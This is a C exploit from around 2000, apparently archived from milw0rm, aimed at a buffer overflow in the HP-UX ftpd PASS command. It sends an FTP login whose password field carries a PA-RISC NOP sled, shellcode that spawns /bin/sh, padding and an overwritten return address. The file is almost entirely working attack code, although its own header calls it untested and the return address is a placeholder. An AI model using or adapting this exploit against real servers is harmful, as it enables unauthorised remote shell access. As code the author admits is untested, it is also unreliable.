/* theoretical exploit for hpux ftpd vulnerability              */
/* not tested anywhere, needs tweaking                          */

/* (c) 2000 by babcia padlina ltd. <venglin@freebsd.lublin.pl>  */

#include <stdio.h>
#include <stdlib.h>

#define NOPS 100
#define BUFSIZE 1024

char shellcode[] =                       /*   HP-UX shellcode   */
  "\x34\x16\x05\x06\x96\xd6\x05\x34\x20\x20\x08\x01\xe4\x20\xe0\x08\x0b"
  "\x5a\x02\x9a\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41"
  "\x04\x02\x60\x40\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02"
  "\x98\x34\x16\x04\xbe\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34"
  "\xde\xad\xca\xfe\x2f\x62\x69\x6e\x2f\x73\x68";

char nop[] = "\x08\x21\x02\x80";                /*  PA-RISC NOP */

unsigned long ret = 0xdeadbeef;

int main(argc, argv)
int argc;
char **argv;
{
  int stackofs;
  char buf[BUFSIZ*2];
  int i;

  for (strcpy(buf, "PASS "),i=0;i<NOPS;i++) strcat(buf, nop);
  sprintf(buf+strlen(buf), "%s%%.%dd%c%c%c%c", shellcode,
    BUFSIZE-strlen(shellcode)-NOPS*4-4,
    ((int)ret & 0xff), (((int)ret & 0xff00) >> 8),
    (((int)ret & 0xff0000) >> 16),
    (((int)ret & 0xff000000) >> 24));
  printf("USER ftp\r\n%s\r\n", buf);

  exit(0);
}


// milw0rm.com [2000-12-01]